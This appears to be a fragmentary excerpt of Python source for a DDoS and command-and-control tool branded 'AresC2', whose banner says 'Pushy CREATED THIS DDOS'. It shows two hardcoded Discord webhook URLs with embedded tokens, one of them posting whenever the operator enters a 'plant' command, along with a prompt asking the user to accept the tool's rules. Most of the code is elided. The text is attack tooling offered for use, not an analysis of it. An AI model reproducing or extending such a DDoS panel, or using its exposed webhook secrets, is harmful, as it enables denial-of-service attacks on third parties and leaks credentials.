...
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1045660200771801088/NCz3MZcFAiTpOmQyQfPwzIL1OtvZj_Mrx-HeX_yP5LmUq4MFyT6HGGu9tTYmI0KpurJe", username="AresC2", content=content)
...
os.system("clear")
print (rulesstart)
understand = str(input("\033[0;93mDo You Understand The Rules? (y/n):\033[33m"))
...
\033[0;96m                              
\033[0;96m =============Pushy CREATED THIS DDOS======================"""
...
def main():
    ...
    while True:
        ...
        if sinput == "plant":
            ...
            webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1074325499742011412/mvLm5fZ6pZmZgsBzVz7VMLkwiyEF4imjl9910qjCrbjp_MjfX5t-3tACN6kyQ_whpj0D", username="AresC2")
